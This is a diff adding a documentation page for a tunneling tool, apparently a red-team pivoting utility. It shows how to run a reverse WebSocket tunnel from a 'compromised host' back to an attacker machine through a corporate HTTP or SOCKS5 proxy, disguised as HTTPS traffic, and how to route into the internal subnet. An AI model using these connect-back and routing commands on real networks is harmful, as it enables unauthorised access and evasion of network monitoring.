@@ -1,0 +1,42 @@
+---
+title: HTTP Proxy Example
+description: Tunnel through an HTTP or SOCKS5 proxy using the WebSockets transport.
+order: 9
+---
+
+# HTTP Proxy Example
+
+In this example, the compromised host (`10.0.1.5`) sits behind a corporate HTTP proxy that intercepts all outbound connections. The exit node uses WebSockets on TCP/443 so the tunnel traffic appears as HTTPS, and the proxy is configured via the standard `HTTPS_PROXY` environment variable.
+
+The entry node (`192.168.1.5`) listens on TCP/443. Port 443 is used here because the proxy expects HTTPS traffic and the WebSocket upgrade handshake is indistinguishable from a standard HTTPS connection.
+
+{% trafficflow flow="192.168.1.5 (entry) -> proxy.corp.internal:8080 -> 10.0.1.5 (exit) -> 10.10.0.0/24" label="Traffic Flow:" /%}
+
+{% steps %}
+{% step title="Attacker (192.168.1.5)" number=1 %}
+An [entry node](/concepts) listening for WebSocket connections on TCP/443.
+
+{% codeblock code="wallhack entry --listen :443/tcp" /%}
+{% /step %}
+
+{% step title="Compromised Host (10.0.1.5)" number=2 %}
+An [exit node](/concepts) connecting back through the corporate proxy. Set `HTTPS_PROXY` to the proxy address before starting.
+
+```bash
+export HTTPS_PROXY=http://proxy.corp.internal:8080
+wallhack exit --connect 192.168.1.5:443/tcp
+```
+{% /step %}
+
+{% step title="Configure Routes" number=3 %}
+Add routes for the networks accessible through the compromised host.
+
+```bash
+ip route add 10.10.0.0/24 dev tun0
+```
+{% /step %}
+{% /steps %}
+
+{% callout type="note" %}
+SOCKS5 proxies are also supported. Set `HTTPS_PROXY=socks5://proxy.corp.internal:1080` instead. `NO_PROXY` is respected for comma-separated host exclusions.
+{% /callout %}
